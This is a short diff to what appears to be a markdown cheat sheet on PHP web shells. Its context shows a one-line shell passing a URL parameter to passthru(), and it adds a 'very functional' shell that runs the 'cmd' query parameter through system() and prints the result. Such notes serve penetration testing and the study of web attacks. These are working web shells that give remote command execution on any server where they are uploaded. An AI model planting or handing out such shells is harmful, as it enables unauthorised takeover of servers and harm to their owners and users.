@@ -37,7 +37,15 @@ passthru\(\):
 <?php passthru($_GET['cmd']);?>
 ```
 
-We can a create a more functional shells as follows:
+Very functional shell:
+
+```php
+<?php
+    echo "<pre>" . system($_GET['cmd']) . "</pre>";
+?>
+```
+
+We can a create a more functional shell as follows:
 
 ```php
 # Upload
